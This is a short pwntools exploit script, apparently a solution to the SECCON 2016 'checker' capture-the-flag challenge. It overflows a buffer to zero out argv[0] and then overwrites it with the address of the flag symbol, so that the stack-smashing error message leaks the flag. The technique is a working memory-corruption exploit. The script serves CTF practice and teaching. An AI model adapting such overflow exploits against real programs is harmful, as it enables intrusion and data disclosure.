#!/usr/bin/python2
# Source: https://bannsecurity.com/index.php/home/10-ctf-writeups/39-seccon-2016-checker

from pwn import *

elf = ELF("checker")

p = process("checker")
#p = remote("checker.pwn.seccon.jp",14726)

p.recvuntil("NAME : ")
p.sendline("Blerg") # This doesn't matter

# Adjust as necessary
argv0_off = 376

# Zero out argv[0]
for i in range(8):
    p.recvuntil(">> ")
    p.sendline("A"*(argv0_off+8-i))

# Now we can say yes
p.sendline("yes")


# Send the address of the flag to argv[0] to have the error message leak the flag for us.
p.sendline(cyclic(argv0_off,n=8) + p64(elf.symbols['flag']))

p.interactive()
